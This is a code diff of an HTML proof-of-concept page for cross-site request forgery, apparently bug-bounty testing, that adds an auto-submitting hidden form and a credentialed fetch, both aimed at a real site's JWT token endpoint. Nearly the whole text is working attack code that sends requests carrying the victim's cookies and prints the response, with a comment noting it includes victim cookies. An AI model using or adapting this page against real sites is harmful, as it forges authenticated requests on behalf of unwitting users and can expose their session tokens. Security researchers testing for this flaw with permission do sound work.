@@ -2,11 +2,12 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CSRF PoC with Error Handling</title>
+  <title>CSRF PoC - Dual Test</title>
 </head>
 <body>
-  <h2>CSRF PoC - With Error Logging</h2>
-  <button onclick="exploit()">Trigger Request</button>
+  <h2>CSRF PoC - Form & JSON Test</h2>
+  <button onclick="testForm()">Send Form-Encoded CSRF</button>
+  <button onclick="testJSON()">Send JSON CSRF</button>
 
   <pre id="output"></pre>
 
@@ -15,19 +16,40 @@
       document.getElementById("output").textContent += msg + "\n";
     }
 
-    function exploit() {
+    // ✅ Allowed by browsers in real CSRF
+    function testForm() {
+      log("=== Sending Form-Encoded CSRF ===");
+      var f = document.createElement("form");
+      f.method = "POST";
+      f.action = "https://www.datacamp.com/api/jwt/token"; // replace with target endpoint
+
+      var input = document.createElement("input");
+      input.type = "hidden";
+      input.name = "id";
+      input.value = "123"; // example payload
+      f.appendChild(input);
+
+      document.body.appendChild(f);
+      f.submit();
+      log("Form submitted. If server accepts x-www-form-urlencoded → VULNERABLE.");
+    }
+
+    // ❌ Needs CORS bypass to succeed
+    function testJSON() {
+      log("=== Sending JSON with custom headers ===");
       fetch("https://www.datacamp.com/api/jwt/token", {
-        method: "GET",
-        credentials: "include", // include victim cookies
+        method: "POST",
+        credentials: "include",
         headers: {
-          "X-Requested-With": "XMLHttpRequest",
-          "Accept": "application/json, text/plain, */*"
-        }
+          "Content-Type": "application/json",
+          "X-Requested-With": "XMLHttpRequest"
+        },
+        body: JSON.stringify({ id: "123" })
       })
-      .then(async response => {
-        log("Status: " + response.status);
-        const text = await response.text();
-        log("Response:\n" + text);
+      .then(async res => {
+        log("Status: " + res.status);
+        const txt = await res.text();
+        log("Response:\n" + txt);
       })
       .catch(err => {
         log("Error: " + err);
